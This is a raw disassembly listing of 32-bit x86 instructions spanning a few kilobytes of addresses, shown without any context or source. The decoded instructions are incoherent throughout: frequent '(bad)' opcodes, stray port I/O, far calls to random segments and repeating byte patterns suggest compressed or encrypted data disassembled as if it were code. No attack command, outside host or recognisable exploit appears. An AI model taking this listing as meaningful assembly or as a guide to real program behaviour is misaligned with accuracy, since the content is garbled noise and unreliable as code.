  41fb88:	loope  0x41fbe0
  41fb8a:	add    eax,DWORD PTR [ecx+0x5c]
  41fb8d:	xchg   ebp,eax
  41fb8e:	scas   eax,DWORD PTR es:[edi]
  41fb8f:	iret   
	...
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	fadd   DWORD PTR [esi+0x51d4e968]
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	add    BYTE PTR [edi],dh
  41fc0e:	lods   eax,DWORD PTR ds:[esi]
  41fc0f:	je     0x41fc8e
  41fc11:	push   ebx
  41fc12:	and    eax,DWORD PTR [edi]
  41fc14:	iret   
  41fc15:	xor    al,0xb5
  41fc17:	outs   dx,BYTE PTR ds:[esi]
  41fc18:	add    DWORD PTR [ecx+esi*4],0x25e88ba5
  41fc1f:	pusha  
  41fc20:	popf   
  41fc21:	(bad)  
  41fc22:	lahf   
  41fc23:	out    0x2c,al
  41fc25:	mov    ch,0x19
  41fc27:	das    
  41fc28:	cmp    al,0x39
  41fc2a:	dec    edx
  41fc2b:	arpl   WORD PTR [ecx],cx
  41fc2d:	or     esp,ebx
  41fc2f:	aad    0x50
  41fc31:	push   edi
  41fc32:	sbb    edx,DWORD PTR [edx]
  41fc34:	jno    0x41fc13
  41fc36:	loope  0x41fc65
  41fc38:	aaa    
  41fc39:	(bad)  
  41fc3a:	sub    esp,DWORD PTR [edi+0x52642349]
  41fc40:	push   es
  41fc41:	pop    esi
  41fc42:	dec    ebx
  41fc43:	xchg   esi,eax
  41fc44:	rol    DWORD PTR [esi],0xec
  41fc47:	sti    
  41fc48:	scas   al,BYTE PTR es:[edi]
  41fc49:	xlat   BYTE PTR ds:[ebx]
  41fc4a:	jb     0x41fbd1
  41fc4c:	shl    al,1
  41fc4e:	aam    0xc8
  41fc50:	repz sub edx,DWORD PTR [edx-0x23b84e93]
  41fc57:	mov    bl,BYTE PTR [edi]
  41fc59:	ins    DWORD PTR es:[edi],dx
  41fc5a:	add    BYTE PTR [eax+0xff8de73],0x50
  41fc61:	mov    al,0x3e
  41fc63:	dec    ecx
  41fc64:	push   ecx
  41fc65:	pop    ss
  41fc66:	icebp  
  41fc67:	mov    al,BYTE PTR [edx]
  41fc69:	popf   
  41fc6a:	loop   0x41fc87
  41fc6c:	push   ebx
  41fc6d:	jge    0x41fc9d
  41fc6f:	pop    ss
  41fc70:	dec    esp
  41fc71:	out    0x3e,eax
  41fc73:	pop    ebp
  41fc74:	jno    0x41fc48
  41fc76:	mov    cl,dh
  41fc78:	int    0x62
  41fc7a:	in     eax,dx
  41fc7b:	sbb    DWORD PTR [ecx-0x26],edx
  41fc7e:	cs inc ecx
  41fc80:	mov    BYTE PTR [ebx],al
  41fc82:	es call 0x370:0x599aaf4d
  41fc8a:	sahf   
  41fc8b:	and    al,0xa5
  41fc8d:	test   eax,0xa42b23d4
  41fc92:	mov    WORD PTR [edi+0x57],gs
  41fc95:	popf   
  41fc96:	imul   eax,ebx,0xb7a3204d
  41fc9c:	aas    
  41fc9d:	bound  ebx,QWORD PTR [edx]
  41fc9f:	jecxz  0x41fc2d
  41fca1:	dec    eax
  41fca2:	test   al,0xa1
  41fca4:	jmp    0x8f1c:0xff799c01
  41fcab:	mov    DWORD PTR [esi],ebp
  41fcad:	sbb    edi,0xffffffbd
  41fcb0:	fwait
  41fcb1:	in     al,0x89
  41fcb3:	popf   
  41fcb4:	jmp    0x1aef:0x6ac637b1
  41fcbb:	arpl   WORD PTR [eax],si
  41fcbd:	mov    eax,0x37d9f79
  41fcc2:	pop    esi
  41fcc3:	push   ss
  41fcc4:	js     0x41fd3f
  41fcc6:	or     DWORD PTR [ebx+0x315709bb],ecx
  41fccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fccd:	into   
  41fcce:	dec    esi
  41fccf:	xchg   ecx,eax
  41fcd0:	test   eax,0xb0120cd4
  41fcd5:	add    BYTE PTR [edi],ch
  41fcd7:	push   esi
  41fcd8:	sbb    bh,BYTE PTR [edi-0x74]
  41fcdb:	pop    ecx
  41fcdc:	pop    esi
  41fcdd:	lods   eax,DWORD PTR ds:[esi]
  41fcde:	rcr    BYTE PTR [ebx],cl
  41fce0:	(bad)  
  41fce1:	jmp    0x41fcea
  41fce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fce4:	data16 lods al,BYTE PTR ds:[esi]
  41fce6:	inc    esp
  41fce7:	jle    0x41fd5c
  41fce9:	jle    0x41fc97
  41fceb:	push   cs
  41fcec:	sub    esi,eax
  41fcee:	int    0x88
  41fcf0:	sub    BYTE PTR [eax],dl
  41fcf2:	and    BYTE PTR [edi+0x4f813e54],ah
  41fcf8:	imul   DWORD PTR [ecx]
  41fcfa:	pushf  
  41fcfb:	and    DWORD PTR [edi+0x15877bb1],0xffffffab
  41fd02:	pop    ax
  41fd04:	jb     0x41fd20
  41fd06:	leave  
  41fd07:	cdq    
  41fd08:	or     eax,0x9219735c
  41fd0d:	out    dx,al
  41fd0e:	sahf   
  41fd0f:	inc    edx
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	(bad)  
  41fd81:	loope  0x41fd32
  41fd83:	fstp   st(0)
  41fd85:	push   edx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    al,0x1
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	in     al,dx
  41fd8d:	xlat   BYTE PTR ds:[ebx]
  41fd8e:	dec    eax
  41fd8f:	inc    ebp
  41fd90:	call   0xf188:0x5e15902a
  41fd97:	cli    
  41fd98:	and    BYTE PTR [esi-0x56721d15],bh
  41fd9e:	into   
  41fd9f:	xchg   esp,eax
  41fda0:	js     0x41fdc9
  41fda2:	jnp    0x41fdd5
  41fda4:	and    BYTE PTR ss:[edx-0x24],dl
  41fda8:	mov    fs,WORD PTR [ebx+0x45]
  41fdab:	push   ebx
  41fdac:	cdq    
  41fdad:	add    esi,DWORD PTR [ebp-0x4a34a838]
  41fdb3:	ss mov ebx,0xeb477ee6
  41fdb9:	and    ah,cl
  41fdbb:	mov    BYTE PTR [edx],bl
  41fdbd:	inc    esp
  41fdbe:	fisubr DWORD PTR [ebp+0x7e]
  41fdc1:	add    bh,bl
  41fdc3:	sbb    bh,BYTE PTR [eax]
  41fdc5:	mov    esp,0xfc47d8b6
  41fdca:	lahf   
  41fdcb:	cdq    
  41fdcc:	push   ds
  41fdcd:	mov    esp,0x3be9cc30
  41fdd2:	add    BYTE PTR [edi-0x7e53dbc8],ah
  41fdd8:	mov    edx,0xa97154d3
  41fddd:	mov    ecx,0x863c5f56
  41fde2:	mov    ah,0x9c
  41fde4:	dec    edx
  41fde5:	cdq    
  41fde6:	ins    DWORD PTR es:[edi],dx
  41fde7:	mov    ch,0x3c
  41fde9:	not    BYTE PTR [edx]
  41fdeb:	out    dx,al
  41fdec:	daa    
  41fded:	pop    esi
  41fdee:	jge    0x41fdcf
  41fdf0:	out    dx,al
  41fdf1:	xchg   ebp,eax
  41fdf2:	push   eax
  41fdf3:	bound  eax,QWORD PTR [edi+edx*2-0x6179119f]
  41fdfa:	(bad)  
  41fdfb:	lds    ebx,FWORD PTR [edx+0x1d]
  41fdfe:	mov    dx,0xa224
  41fe02:	fadd   st,st(1)
  41fe04:	push   es
  41fe05:	xchg   edi,eax
  41fe06:	inc    ecx
  41fe07:	xor    al,0x85
  41fe09:	xor    ebp,0x22b2c1ed
  41fe0f:	imul   ebx,DWORD PTR [eax],0xffffffd6
  41fe12:	cmp    DWORD PTR [ecx-0x74],eax
  41fe15:	test   eax,0x5b03c930
  41fe1a:	mov    eax,0x90a699d0
  41fe1f:	outs   dx,DWORD PTR ds:[esi]
  41fe20:	ins    DWORD PTR es:[edi],dx
  41fe21:	jae    0x41fde4
  41fe23:	sub    BYTE PTR [edx],bh
  41fe25:	call   0xf178:0x9e3feec9
  41fe2c:	or     edx,edi
  41fe2e:	mov    eax,0x9f88a38
  41fe33:	add    eax,0x65fc3f0f
  41fe38:	scas   al,BYTE PTR es:[edi]
  41fe39:	or     ecx,DWORD PTR [edx]
  41fe3b:	mov    al,0xa7
  41fe3d:	sbb    ebx,DWORD PTR [eax+0x2858c6eb]
  41fe43:	bound  esi,QWORD PTR [esi-0x5722b4c2]
  41fe49:	in     eax,dx
  41fe4a:	int3   
  41fe4b:	mov    bl,0x81
  41fe4d:	in     al,0x40
  41fe4f:	cmp    ch,BYTE PTR [esi]
  41fe51:	cld    
  41fe52:	add    al,0x67
  41fe54:	mov    bh,0x7b
  41fe56:	mov    dl,0xf6
  41fe58:	add    DWORD PTR [edi+0x51],ebx
  41fe5b:	and    al,0xaa
  41fe5d:	jb     0x41feb5
  41fe5f:	in     eax,0x81
  41fe61:	mov    DWORD PTR [edx+0x3c],esi
  41fe64:	push   ecx
  41fe65:	or     eax,0x55d91820
  41fe6a:	mov    dh,0x7b
  41fe6c:	or     edi,ebp
  41fe6e:	adc    al,ch
  41fe70:	mov    DWORD PTR [eax-0xad517b1],edx
  41fe76:	test   eax,0x33f01f0c
  41fe7b:	call   0x7e1b:0x40350513
  41fe82:	push   esp
  41fe83:	int    0x5d
  41fe85:	add    edx,DWORD PTR [esi]
  41fe87:	cmp    DWORD PTR [ebp-0x4ed4c4ca],edx
  41fe8d:	pop    ss
  41fe8e:	out    0x93,al
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xaf
  41ff01:	sbb    al,0x44
  41ff03:	leave  
  41ff04:	fcom   QWORD PTR [ebx+0x1]
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	movzx  ebx,BYTE PTR [edi+0x52]
  41ff10:	aad    0xb1
  41ff12:	test   al,0xef
  41ff14:	fst    QWORD PTR [esi+0x3b1ad7fc]
  41ff1a:	and    al,BYTE PTR gs:[ecx-0x7f]
  41ff1e:	frstor [ebx-0x31797a94]
  41ff24:	clc    
  41ff25:	xor    edx,DWORD PTR [ecx-0x34]
  41ff28:	out    0x9,al
  41ff2a:	test   BYTE PTR [ebp+0x15],0x57
  41ff2e:	fidivr WORD PTR [edi]
  41ff30:	xchg   ebx,eax
  41ff31:	jnp    0x41ffa1
  41ff33:	xchg   esi,eax
  41ff34:	out    0x79,al
  41ff36:	or     BYTE PTR ds:0x9d45c506,bl
  41ff3c:	dec    esi
  41ff3d:	push   eax
  41ff3e:	dec    esi
  41ff3f:	repnz rol BYTE PTR [ebp+0x4b],0x9b
  41ff44:	sti    
  41ff45:	int    0x12
  41ff47:	add    BYTE PTR [edi],0x3f
  41ff4a:	jbe    0x41ff9a
  41ff4c:	out    0xb6,eax
  41ff4e:	arpl   cx,dx
  41ff50:	xor    BYTE PTR [edx-0x2e],al
  41ff53:	inc    ebp
  41ff54:	add    DWORD PTR [ebp-0x56],ecx
  41ff57:	mov    al,0x11
  41ff59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff5a:	test   BYTE PTR [edx],dl
  41ff5c:	mov    ch,BYTE PTR [esi+0x6685d7ce]
  41ff62:	sub    cl,BYTE PTR [edx+0x24]
  41ff65:	cli    
  41ff66:	dec    edi
  41ff67:	push   edi
  41ff68:	cli    
  41ff69:	sub    esi,ecx
  41ff6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff6c:	or     DWORD PTR [edi-0x5d7f1c5e],ebx
  41ff72:	fild   WORD PTR [edx]
  41ff74:	inc    eax
  41ff75:	inc    ebp
  41ff76:	pop    eax
  41ff77:	fidivr WORD PTR [ecx-0x531d1070]
  41ff7d:	out    dx,eax
  41ff7e:	sahf   
  41ff7f:	push   esi
  41ff80:	in     eax,dx
  41ff81:	pop    es
  41ff82:	or     eax,0xcaedcc8d
  41ff87:	mov    bh,0x39
  41ff89:	sbb    eax,0xc06efb22
  41ff8e:	add    ecx,DWORD PTR [ebp-0x7452a040]
  41ff94:	and    ebx,DWORD PTR [edi+0x7160f07d]
  41ff9a:	xor    DWORD PTR [edi+0x2d8973b0],edx
  41ffa0:	adc    eax,0xc6d3ce60
  41ffa5:	cmc    
  41ffa6:	js     0x420014
  41ffa8:	or     DWORD PTR [ebx],esi
  41ffaa:	dec    ebx
  41ffab:	shr    DWORD PTR [edi],1
  41ffad:	dec    edx
  41ffae:	pop    esi
  41ffaf:	sbb    eax,0x3f6908bb
  41ffb4:	das    
  41ffb5:	mov    es,ecx
  41ffb7:	inc    edi
  41ffb8:	inc    esp
  41ffb9:	or     al,0x88
  41ffbb:	and    BYTE PTR ds:[edi+0x364b3f5f],bh
  41ffc2:	or     eax,0x4b1a634e
  41ffc7:	and    bh,cl
  41ffc9:	fwait
  41ffca:	data16 aaa 
  41ffcc:	call   0x777b:0xe658b028
  41ffd3:	cmp    edx,DWORD PTR [ebx-0x4f]
  41ffd6:	popa   
  41ffd7:	push   esp
  41ffd8:	jo     0x41ffce
  41ffda:	int3   
  41ffdb:	outs   dx,DWORD PTR ds:[esi]
  41ffdc:	fs mov dl,0xb5
  41ffdf:	and    edx,DWORD PTR [edx]
  41ffe1:	mov    cl,0xad
  41ffe3:	mov    cl,0x3c
  41ffe5:	jns    0x42004a
  41ffe7:	repnz mov BYTE PTR [ecx],al
  41ffea:	fdivr  QWORD PTR [edi-0x1e]
  41ffed:	jns    0x41ff87
  41ffef:	sti    
  41fff0:	add    al,0xec
  41fff2:	xor    DWORD PTR [esi],ecx
  41fff4:	push   0xde9a990e
  41fff9:	(bad)  [ecx+ebp*1-0x23]
  41fffd:	iret   
  41fffe:	xor    ebp,DWORD PTR [edx-0x70450999]
  420004:	dec    esp
  420005:	mov    bl,0x77
  420007:	add    edi,DWORD PTR [ebp+0x4c698631]
  42000d:	dec    edi
  42000e:	or     al,0x6d
	...
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff8d
  420081:	add    ebx,ebp
  420083:	nop
  420084:	loopne 0x4200da
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	shl    DWORD PTR [esi-0x1520166a],0xcd
  420093:	xchg   ebx,eax
  420094:	clc    
  420095:	fbstp  TBYTE PTR [eax-0x25002c88]
  42009b:	add    eax,0xdef7193e
  4200a0:	das    
  4200a1:	sub    eax,0x58c754a1
  4200a6:	or     esi,DWORD PTR [ecx]
  4200a8:	add    dl,cl
  4200aa:	push   edx
  4200ab:	sub    bl,BYTE PTR [eax-0x4f7bdb67]
  4200b1:	or     eax,0xaf2c7f7c
  4200b6:	test   al,0x54
  4200b8:	mov    ?,WORD PTR [esp+ebp*8]
  4200bb:	mov    ebx,0xbcfb4dad
  4200c0:	test   DWORD PTR [edx],0x41827d2b
  4200c6:	stos   BYTE PTR es:[edi],al
  4200c7:	(bad)  
  4200c9:	sub    eax,0x1fa83fea
  4200ce:	sub    ecx,DWORD PTR ds:0x3d151eb8
  4200d4:	imul   edi,DWORD PTR [ebx],0x0
  4200d7:	pop    esp
  4200d8:	mov    bl,0x55
  4200da:	test   BYTE PTR [ebx+eiz*1+0x2117e817],ah
  4200e1:	pop    ds
  4200e2:	dec    edi
  4200e3:	inc    BYTE PTR [ecx]
  4200e5:	jo     0x420157
  4200e7:	js     0x4200dd
  4200e9:	lods   al,BYTE PTR ds:[esi]
  4200ea:	retf   
  4200eb:	xlat   BYTE PTR ds:[ebx]
  4200ec:	sub    eax,0xcafc70c4
  4200f1:	enter  0xce8c,0x72
  4200f5:	out    dx,al
  4200f6:	inc    eax
  4200f7:	adc    BYTE PTR [ecx-0x4d],dh
  4200fa:	int    0x6a
  4200fc:	xor    al,0x4e
  4200fe:	lds    esi,FWORD PTR [ebp+0x1f]
  420101:	aad    0x94
  420103:	pop    edx
  420104:	sub    esp,ecx
  420106:	lods   eax,DWORD PTR ds:[esi]
  420107:	pop    ss
  420108:	mov    ds:0x42a4fe2e,eax
  42010d:	push   ss
  42010e:	loop   0x420152
  420110:	xchg   DWORD PTR [edx],esi
  420112:	jge    0x42013d
  420114:	dec    edx
  420115:	and    al,0x1
  420117:	fcom   QWORD PTR [esi-0xf7df1ae]
  42011d:	fbld   TBYTE PTR [ecx]
  42011f:	push   0x49a213d4
  420124:	aas    
  420125:	dec    ebp
  420126:	inc    ecx
  420127:	xchg   edx,eax
  420128:	xchg   esi,eax
  420129:	jmp    0x6b3f630e
  42012e:	das    
  42012f:	push   cs
  420130:	push   edi
  420131:	stos   DWORD PTR es:[edi],eax
  420132:	lods   eax,DWORD PTR ds:[esi]
  420133:	call   0x876e:0xa4f44353
  42013a:	pop    edi
  42013b:	xor    cl,BYTE PTR [ebp+0x2040ea6b]
  420141:	xor    ecx,DWORD PTR [ecx]
  420143:	mov    ds:0xe6c720ab,al
  420148:	dec    ebp
  420149:	mov    ecx,fs
  42014b:	sub    DWORD PTR [edx+eiz*8+0x1],0xfe451da5
  420153:	(bad)  
  420154:	icebp  
  420155:	adc    al,ch
  420157:	adc    eax,edx
  420159:	cld    
  42015a:	arpl   WORD PTR [ebx+0x3328a1f6],ax
  420160:	jb     0x420167
  420162:	out    dx,al
  420163:	fnstcw WORD PTR [ebp+0x29]
  420166:	les    ebx,FWORD PTR [edi-0x4e]
  420169:	pop    ecx
  42016a:	cmp    ebx,esp
  42016c:	ja     0x42017d
  42016e:	fsub   QWORD PTR [edx+esi*4]
  420171:	sub    eax,0x507b1a40
  420176:	(bad)  
  420177:	shr    BYTE PTR [esi+esi*2-0x49171060],cl
  42017e:	dec    esp
  42017f:	xchg   BYTE PTR [ebp+ebp*1+0x7d1ebcd6],dh
  420186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420187:	out    0x3,al
  420189:	mov    edi,0xc4e375dc
  42018e:	lea    ebp,[edi]
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x22e8e2c1],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	push   0xffffffd1
  42020e:	push   ss
  42020f:	jmp    0x6444:0x6ae01f62
  420216:	test   al,0xea
  420218:	or     eax,0x695234ca
  42021d:	stc    
  42021e:	retf   
  42021f:	aam    0xc3
  420221:	lods   eax,DWORD PTR ds:[esi]
  420222:	sti    
  420223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420224:	pop    es
  420225:	jns    0x420267
  420227:	push   eax
  420228:	mov    WORD PTR [edx+0x13b81b05],ds
  42022e:	push   ecx
  42022f:	in     al,dx
  420230:	cmp    edx,eax
  420232:	data16 (bad) 
  420234:	ss arpl WORD PTR ds:[ebx],dx
  420238:	psubq  mm2,QWORD PTR [edx]
  42023b:	inc    edi
  42023c:	mov    ebx,0x90ff7978
  420241:	sbb    eax,0x3e1c2f22
  420246:	ror    DWORD PTR [ebx+0x2c],cl
  420249:	nop
  42024a:	fdivr  QWORD PTR [edx]
  42024c:	jnp    0x420276
  42024e:	jg     0x4201ec
  420250:	mov    ecx,0x1631b3ae
  420255:	push   ds
  420256:	retf   
  420257:	mov    ch,BYTE PTR [eax-0x19eb9dc8]
  42025d:	adc    al,0x54
  42025f:	xor    ah,ah
  420261:	fwait
  420262:	into   
  420263:	pop    eax
  420264:	and    BYTE PTR [edx+0x68879a3d],ah
  42026a:	enter  0xc31,0x10
  42026e:	(bad)  
  42026f:	test   eax,0x57418e55
  420274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420275:	adc    ch,BYTE PTR [ecx+0x955ce48]
  42027b:	or     edi,ecx
  42027d:	and    al,0x53
  42027f:	push   cs
  420280:	and    eax,DWORD PTR [edi-0x71]
  420283:	iret   
  420284:	adc    al,0xd5
  420286:	sub    esp,DWORD PTR [ebx-0x4a1e9540]
  42028c:	or     cl,dh
  42028e:	test   BYTE PTR [edx],ah
  420290:	loopne 0x4202ff
  420292:	push   esp
  420293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420294:	adc    eax,0xcb2295c5
  420299:	mov    al,ds:0xb22baa49
  42029e:	jecxz  0x42023d
  4202a0:	test   DWORD PTR [ebp+eiz*8+0x47],ebx
  4202a4:	sub    DWORD PTR [edx],edi
  4202a6:	adc    ecx,edx
  4202a8:	mov    esp,0xd80ebf8f
  4202ad:	repnz push di
  4202b0:	push   esi
  4202b1:	sub    al,0x56
  4202b3:	mov    cl,0x42
  4202b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b6:	scas   al,BYTE PTR es:[edi]
  4202b7:	mov    esi,0x7da172ec
  4202bc:	dec    eax
  4202bd:	(bad)  
  4202be:	and    BYTE PTR [eax-0x24929f6],dl
  4202c4:	add    DWORD PTR [eax+0x15],edi
  4202c7:	push   ecx
  4202c8:	test   DWORD PTR [edx+0x3dad12da],esi
  4202ce:	gs add eax,0x6b8320e7
  4202d4:	(bad)  
  4202d5:	push   ebp
  4202d6:	mov    bh,0xc0
  4202d8:	dec    edi
  4202d9:	xor    esi,DWORD PTR [ebx]
  4202db:	lock test al,0xe0
  4202de:	repz xchg ecx,eax
  4202e0:	sbb    eax,0xabc06306
  4202e5:	sub    bh,BYTE PTR [esp+ebx*2+0x194da480]
  4202ec:	sbb    eax,DWORD PTR [edi+0x1f]
  4202ef:	sub    al,0xd0
  4202f1:	inc    esp
  4202f2:	add    eax,0x77f3eca1
  4202f7:	xchg   edx,eax
  4202f8:	ins    BYTE PTR es:[edi],dx
  4202f9:	xchg   ebx,eax
  4202fa:	or     al,0xad
  4202fc:	leave  
  4202fd:	stos   DWORD PTR es:[edi],eax
  4202fe:	out    dx,al
  4202ff:	int3   
  420300:	test   cl,dh
  420302:	push   edx
  420303:	(bad)  
  420305:	leave  
  420306:	mov    ds:0x47188e0f,al
  42030b:	fiadd  DWORD PTR [edx]
  42030d:	test   al,0x2
  42030f:	inc    edx
	...
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	retf   0xb1f7
  420383:	pushf  
  420384:	call   0x44204df
  420389:	add    DWORD PTR [eax],eax
  42038b:	add    BYTE PTR [ebx-0x2da8a3ff],cl
  420391:	aas    
  420392:	add    ebx,DWORD PTR [eax+0x3e3b8cc7]
  420398:	add    al,0xfa
  42039a:	push   edi
  42039b:	cmp    BYTE PTR [esi+ebp*1],0x4a
  42039f:	push   ebp
  4203a0:	pop    edx
  4203a1:	mov    ah,0x24
  4203a3:	and    BYTE PTR [edx],bl
  4203a5:	stos   BYTE PTR es:[edi],al
  4203a6:	call   0x38eab890
  4203ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203ac:	ins    BYTE PTR es:[edi],dx
  4203ad:	add    al,0xf3
  4203af:	call   0x9c2587e
  4203b4:	or     ch,BYTE PTR [ebp-0x45]
  4203b7:	pop    edi
  4203b8:	fwait
  4203b9:	xor    al,0x53
  4203bb:	xchg   edx,eax
  4203bc:	call   0x9991:0x9769552a
  4203c3:	add    esi,DWORD PTR [ebx-0x7479c8ba]
  4203c9:	in     al,dx
  4203ca:	fstp   st(4)
  4203cc:	jns    0x420363
  4203ce:	xor    al,0x26
  4203d0:	shl    BYTE PTR [ebp-0x5],1
  4203d3:	ins    DWORD PTR es:[edi],dx
  4203d4:	loope  0x4203bc
  4203d6:	test   eax,0xb737fd8b
  4203db:	inc    ecx
  4203dc:	cwde   
  4203dd:	out    0x40,eax
  4203df:	popa   
  4203e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203e1:	(bad)  
  4203e2:	mov    esp,0x55001b6f
  4203e7:	ins    DWORD PTR es:[edi],dx
  4203e8:	aaa    
  4203e9:	shl    DWORD PTR [eax],1
  4203eb:	in     al,0xdd
  4203ed:	sbb    cl,BYTE PTR [eax]
  4203ef:	xor    BYTE PTR [edx-0x341045dc],dh
  4203f5:	jne    0x420446
  4203f7:	test   eax,0xeefaaa10
  4203fc:	sub    dl,BYTE PTR [edx+esi*2+0x51]
  420400:	ss cli 
  420402:	jge    0x420421
  420404:	das    
  420405:	(bad)
  420408:	push   ds
  420409:	pushf  
  42040a:	fnstsw WORD PTR [ecx]
  42040c:	sbb    eax,0xa5203958
  420411:	adc    ebp,DWORD PTR [edi-0x6f]
  420414:	test   al,0xb8
  420416:	mov    ah,0x21
  420418:	push   edi
  420419:	ret    
  42041a:	xor    bl,BYTE PTR [eax-0x4a]
  42041d:	or     eax,0xe13a9b9d
  420422:	sub    bl,BYTE PTR [esi+0x31]
  420425:	fsubr  DWORD PTR [edx+0x18]
  420428:	inc    edi
  420429:	or     BYTE PTR [eax],al
  42042b:	sti    
  42042c:	test   eax,0xe3990980
  420431:	rol    ecx,1
  420433:	push   eax
  420434:	cmp    ecx,DWORD PTR [ebp-0x3c]
  420437:	bnd jo 0x4203ff
  42043a:	pop    edi
  42043b:	push   ds
  42043c:	or     DWORD PTR [ecx],edx
  42043e:	les    esi,FWORD PTR [edx-0x1baad3a8]
  420444:	daa    
  420445:	adc    bh,bl
  420447:	out    dx,eax
  420448:	mov    ch,0x99
  42044a:	and    bh,BYTE PTR [edi+edx*2]
  42044d:	dec    esp
  42044e:	inc    ebx
  42044f:	es jecxz 0x4203d3
  420452:	popf   
  420453:	loope  0x420406
  420455:	mov    edi,0x71676fe5
  42045a:	jno    0x42045b
  42045c:	mov    gs,ebp
  42045e:	sub    al,ch
  420460:	int3   
  420461:	inc    esp
  420462:	popa   
  420463:	lods   al,BYTE PTR ds:[esi]
  420464:	cld    
  420465:	cmc    
  420466:	fnsave [edx+0x58]
  420469:	sub    DWORD PTR [edx],edi
  42046b:	and    eax,0xbd510771
  420470:	shr    DWORD PTR cs:0xf4c03b39,1
  420477:	and    eax,0xb92c04e8
  42047c:	push   cs
  42047d:	jnp    0x42049b
  42047f:	xor    DWORD PTR [edx],esi
  420481:	dec    ebx
  420482:	stos   DWORD PTR es:[edi],eax
  420483:	cmp    al,0xba
  420485:	pop    esp
  420486:	test   ebp,0xd8c1da95
  42048c:	mov    bl,0xa9
  42048e:	mov    ecx,0xc5
	...
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	xchg   al,cl
  420502:	push   eax
  420503:	push   0x157ec
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	xchg   edi,eax
  42050d:	int3   
  42050e:	xchg   edi,eax
  42050f:	pop    ecx
  420510:	sub    al,0x29
  420513:	push   esi
  420514:	pushf  
  420515:	cs or  ch,dl
  420518:	or     bh,BYTE PTR [edi+0x27c4ae67]
  42051e:	sbb    DWORD PTR [eax],edi
  420520:	pushf  
  420521:	jns    0x420514
  420523:	push   edx
  420524:	inc    ebx
  420525:	cdq    
  420526:	nop
  420527:	push   cs
  420528:	adc    edi,DWORD PTR [edi-0x65]
  42052b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42052c:	outs   dx,DWORD PTR ds:[esi]
  42052d:	cs retf 0xfe66
  420531:	pop    ss
  420532:	call   0xd8ab:0x97bcfb59
  420539:	scas   al,BYTE PTR es:[edi]
  42053a:	sbb    al,0xd1
  42053c:	sbb    ebp,ebx
  42053e:	mov    esp,DWORD PTR [eax+0x2]
  420541:	add    ebx,esi
  420543:	in     eax,dx
  420544:	shl    esp,1
  420546:	xchg   BYTE PTR [ecx-0x17ce147e],bh
  42054c:	jo     0x420535
  42054e:	push   ebp
  42054f:	rol    BYTE PTR [esi+esi*1+0x7],0x23
  420554:	jb     0x42059b
  420556:	sbb    al,0xcf
  420558:	inc    edx
  420559:	mov    dh,0xa6
  42055b:	adc    esp,DWORD PTR [edx-0x66b51a11]
  420561:	inc    esp
  420562:	outs   dx,DWORD PTR ds:[esi]
  420563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420564:	lods   eax,DWORD PTR ds:[esi]
  420565:	rcr    BYTE PTR es:[ebp-0x4e],cl
  420569:	and    eax,0x1b2721c
  42056e:	je     0x420548
  420570:	aaa    
  420571:	jae    0x420514
  420573:	imul   edi,DWORD PTR [edx],0xe6244c47
  420579:	inc    ebx
  42057a:	mov    dl,0xab
  42057c:	inc    esp
  42057d:	and    esp,DWORD PTR [ebx-0x2f]
  420580:	mov    esp,0x3e346c11
  420585:	jnp    0x4205bb
  420587:	popa   
  420588:	jns    0x420572
  42058a:	mov    edi,0xd2080ca6
  42058f:	ss jnp 0x42056c
  420592:	push   edx
  420593:	enter  0x158b,0x1e
  420597:	fidiv  DWORD PTR [ecx]
  420599:	out    dx,al
  42059a:	addr16 leave 
  42059c:	mov    esp,0x3047efb9
  4205a1:	cmp    eax,0xaccf965e
  4205a6:	pop    esp
  4205a7:	lods   al,BYTE PTR ds:[esi]
  4205a8:	mov    ds:0xa531dcf7,al
  4205ad:	push   esi
  4205ae:	popa   
